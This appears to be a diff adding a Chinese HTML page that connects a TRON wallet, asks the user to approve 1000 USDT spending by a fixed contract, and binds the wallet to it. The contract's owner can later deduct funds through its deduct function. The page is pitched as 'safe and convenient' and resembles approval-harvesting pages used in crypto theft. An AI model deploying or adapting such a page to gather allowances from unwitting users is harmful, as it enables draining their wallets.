@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>USDT 授权绑定</title>
+    <!-- TronWeb 库 -->
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 32px;
+            padding: 32px 24px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 25px 45px rgba(0,0,0,0.2);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        h1 {
+            text-align: center;
+            color: #fff;
+            font-size: 28px;
+            margin-bottom: 8px;
+        }
+        .sub {
+            text-align: center;
+            color: rgba(255,255,255,0.7);
+            font-size: 14px;
+            margin-bottom: 32px;
+        }
+        .info-box {
+            background: rgba(0,0,0,0.3);
+            border-radius: 20px;
+            padding: 16px;
+            margin-bottom: 24px;
+        }
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 14px;
+            word-break: break-all;
+        }
+        .info-label {
+            color: rgba(255,255,255,0.6);
+            min-width: 80px;
+        }
+        .info-value {
+            color: #fff;
+            text-align: right;
+            font-family: monospace;
+        }
+        .address {
+            font-size: 12px;
+            max-width: 240px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        button {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 48px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-bottom: 16px;
+        }
+        .btn-connect {
+            background: #2d6a4f;
+            color: white;
+            box-shadow: 0 4px 12px rgba(45,106,79,0.3);
+        }
+        .btn-connect:hover {
+            background: #1b4d3e;
+            transform: translateY(-2px);
+        }
+        .btn-approve {
+            background: #ff8c00;
+            color: white;
+            box-shadow: 0 4px 12px rgba(255,140,0,0.3);
+        }
+        .btn-approve:hover:not(:disabled) {
+            background: #e07a00;
+            transform: translateY(-2px);
+        }
+        .btn-bind {
+            background: #0d6efd;
+            color: white;
+            box-shadow: 0 4px 12px rgba(13,110,253,0.3);
+        }
+        .btn-bind:hover:not(:disabled) {
+            background: #0b5ed7;
+            transform: translateY(-2px);
+        }
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .status {
+            background: rgba(0,0,0,0.4);
+            border-radius: 40px;
+            padding: 12px 16px;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #ddd;
+            text-align: center;
+        }
+        .loading {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: rgba(255,255,255,0.4);
+            margin-top: 20px;
+        }
+        hr {
+            border-color: rgba(255,255,255,0.1);
+            margin: 16px 0;
+        }
+        @media (max-width: 480px) {
+            .card { padding: 24px 16px; }
+            button { padding: 14px; font-size: 16px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>🔗 USDT 授权绑定</h1>
+        <div class="sub">一键授权 · 安全便捷</div>
+
+        <div class="info-box">
+            <div class="info-row">
+                <span class="info-label">合约地址</span>
+                <span class="info-value address" id="contractAddrDisplay">TRZvddUZXAoriYEdrzVdMjcpE6VVVwQAis</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">授权额度</span>
+                <span class="info-value">1,000 USDT</span>
+            </div>
+            <div class="info-row" id="walletRow" style="display: none;">
+                <span class="info-label">当前钱包</span>
+                <span class="info-value address" id="walletAddress">-</span>
+            </div>
+        </div>
+
+        <button id="connectBtn" class="btn-connect">🔌 连接钱包</button>
+        <button id="approveBtn" class="btn-approve" disabled>💰 授权 1000 USDT</button>
+        <button id="bindBtn" class="btn-bind" disabled>🔗 绑定合约</button>
+
+        <div id="statusMsg" class="status">
+            ⚡ 请先连接钱包
+        </div>
+        <div class="footer">
+            ⚠️ 授权后，合约可扣取最多 1000 USDT<br>
+            仅需操作一次，后续自动扣款
+        </div>
+    </div>
+
+    <script>
+    // ==================== 配置信息 ====================
+    const CONTRACT_ADDRESS = "TRZvddUZXAoriYEdrzVdMjcpE6VVVwQAis";
+    const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const APPROVE_AMOUNT = "1000000000";  // 1000 USDT
+
+    // 你的合约 ABI（完整版）
+    const CONTRACT_ABI = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"}],"name":"Bound","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Deducted","type":"event"},{"inputs":[],"name":"USDT","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"bind","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"deduct","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getContractBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"isBound","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}];
+
+    // USDT 最小 ABI
+    const USDT_ABI = [{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},{"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"}];
+
+    // ==================== DOM 元素 ====================
+    const connectBtn = document.getElementById('connectBtn');
+    const approveBtn = document.getElementById('approveBtn');
+    const bindBtn = document.getElementById('bindBtn');
+    const statusDiv = document.getElementById('statusMsg');
+    const walletRow = document.getElementById('walletRow');
+    const walletAddressSpan = document.getElementById('walletAddress');
+
+    let tronWeb = null;
+    let userAddress = null;
+    let usdtContract = null;
+    let myContract = null;
+
+    function setStatus(msg, isLoading = false) {
+        if (isLoading) {
+            statusDiv.innerHTML = `<span class="loading"></span> ${msg}`;
+        } else {
+            statusDiv.innerHTML = msg;
+        }
+    }
+
+    function setButtonsState(approveEnabled, bindEnabled) {
+        approveBtn.disabled = !approveEnabled;
+        bindBtn.disabled = !bindEnabled;
+    }
+
+    // 等待 TronLink 注入完成（关键修复）
+    function waitForTronLink() {
+        return new Promise((resolve) => {
+            if (window.tronLink && window.tronLink.ready) {
+                resolve(window.tronLink);
+                return;
+            }
+            if (window.tronWeb && window.tronWeb.ready) {
+                resolve(window.tronWeb);
+                return;
+            }
+            // 监听 tronLink 注入事件
+            document.addEventListener('tronLink#initialized', () => {
+                resolve(window.tronLink);
+            });
+            // 超时 3 秒后重试
+            setTimeout(() => {
+                if (window.tronLink) resolve(window.tronLink);
+                else if (window.tronWeb) resolve(window.tronWeb);
+                else resolve(null);
+            }, 3000);
+        });
+    }
+
+    // 连接钱包
+
+    async function connectWallet() {
+    setStatus("⏳ 正在连接钱包...", true);
+
+    // 1. 等待 TronLink 注入完成
+    let tronLinkInstance = window.tronLink;
+    if (!tronLinkInstance) {
+        // 如果还没有，等待一下
+        await new Promise(resolve => {
+            const check = setInterval(() => {
+                if (window.tronLink) {
+                    clearInterval(check);
+                    resolve();
+                }
+            }, 100);
+        });
+        tronLinkInstance = window.tronLink;
+    }
+
+    // 2. 获取 TronLink 内置的 tronWeb 对象 (这是关键)
+    let realTronWeb = tronLinkInstance.tronWeb;
+    if (!realTronWeb) {
+        setStatus("❌ 无法获取 TronWeb 实例，请刷新页面重试", false);
+        return;
+    }
+
+    // 3. 确保 tronWeb 实例已经 ready
+    if (realTronWeb && realTronWeb.ready) {
+        await realTronWeb.ready;
+    }
+
+    // 4. 获取默认地址
+    let accounts = [];
+    try {
+        // 方式一：通过 tronWeb 直接获取
+        if (realTronWeb.defaultAddress && realTronWeb.defaultAddress.base58) {
+            accounts = [realTronWeb.defaultAddress.base58];
+        }
+        // 方式二：如果没有，尝试请求账户
+        if (!accounts.length && tronLinkInstance.request) {
+            accounts = await tronLinkInstance.request({ method: 'tron_requestAccounts' });
+        }
+    } catch (e) {
+        console.warn("获取账户失败", e);
+    }
+
+    if (!accounts || accounts.length === 0) {
+        setStatus("❌ 未获取到钱包地址，请确保钱包已解锁", false);
+        return;
+    }
+
+    // 5. 保存全局变量
+    tronWeb = realTronWeb;
+    userAddress = accounts[0];
+
+    // 更新 UI
+    walletRow.style.display = 'flex';
+    walletAddressSpan.innerText = userAddress;
+
+    // 初始化合约实例 (地址需要转成 hex)
+    try {
+        const usdtHex = tronWeb.address.toHex(USDT_CONTRACT_ADDRESS);
+        const myHex = tronWeb.address.toHex(CONTRACT_ADDRESS);
+        usdtContract = await tronWeb.contract(USDT_ABI, usdtHex);
+        myContract = await tronWeb.contract(CONTRACT_ABI, myHex);
+
+        setStatus(`✅ 连接成功: ${userAddress.substring(0, 8)}...`, false);
+        setButtonsState(true, true);
+
+        await checkAllowance();
+        await checkBound();
+    } catch (err) {
+        console.error(err);
+        setStatus(`❌ 初始化合约失败: ${err.message}`, false);
+    }
+}
+
+    async function checkAllowance() {
+        if (!tronWeb || !usdtContract || !userAddress) return false;
+        try {
+            const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS).call();
+            const approved = tronWeb.toBigNumber(allowance).gte(tronWeb.toBigNumber(APPROVE_AMOUNT));
+            if (approved) {
+                setStatus(`✅ 已授权 ${parseInt(APPROVE_AMOUNT)/1000000} USDT，可以绑定`, false);
+            } else {
+                setStatus(`⚠️ 未授权或授权额度不足，请点击「授权」按钮`, false);
+            }
+            return approved;
+        } catch (e) {
+            console.warn("检查授权失败", e);
+            return false;
+        }
+    }
+
+    async function checkBound() {
+        if (!tronWeb || !userAddress || !myContract) return false;
+        try {
+            const bound = await myContract.isBound(userAddress).call();
+            if (bound) {
+                setStatus(`✅ 已绑定，可以使用扣款功能`, false);
+            }
+            return bound;
+        } catch (e) {
+            console.warn("检查绑定失败", e);
+            return false;
+        }
+    }
+
+    async function approveUSDT() {
+        if (!tronWeb || !usdtContract || !userAddress) {
+            setStatus('❌ 请先连接钱包', false);
+            return;
+        }
+        try {
+            setStatus('⏳ 发起授权请求，请在钱包中确认...', true);
+            approveBtn.disabled = true;
+            const result = await usdtContract.approve(CONTRACT_ADDRESS, APPROVE_AMOUNT).send({
+                feeLimit: 150_000_000
+            });
+            setStatus(`✅ 授权成功！Tx: ${result.substring(0, 10)}...`, false);
+            await checkAllowance();
+        } catch (error) {
+            setStatus(`❌ 授权失败: ${error.message || error}`, false);
+        } finally {
+            approveBtn.disabled = false;
+        }
+    }
+
+    async function bindContract() {
+        if (!tronWeb || !myContract || !userAddress) {
+            setStatus('❌ 请先连接钱包', false);
+            return;
+        }
+        try {
+            const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS).call();
+            if (tronWeb.toBigNumber(allowance).lt(tronWeb.toBigNumber(APPROVE_AMOUNT))) {
+                setStatus('❌ 请先完成授权，再绑定', false);
+                return;
+            }
+            setStatus('⏳ 发起绑定请求，请在钱包中确认...', true);
+            bindBtn.disabled = true;
+            const result = await myContract.bind().send({ feeLimit: 100_000_000 });
+            setStatus(`✅ 绑定成功！Tx: ${result.substring(0, 10)}...`, false);
+            await checkBound();
+        } catch (error) {
+            setStatus(`❌ 绑定失败: ${error.message || error}`, false);
+        } finally {
+            bindBtn.disabled = false;
+        }
+    }
+
+    connectBtn.addEventListener('click', connectWallet);
+    approveBtn.addEventListener('click', approveUSDT);
+    bindBtn.addEventListener('click', bindContract);
+
+    document.getElementById('contractAddrDisplay').innerText = CONTRACT_ADDRESS;
+    setStatus('✅ 准备就绪，点击「连接钱包」开始', false);
+</script>
+
+</body>
+</html>
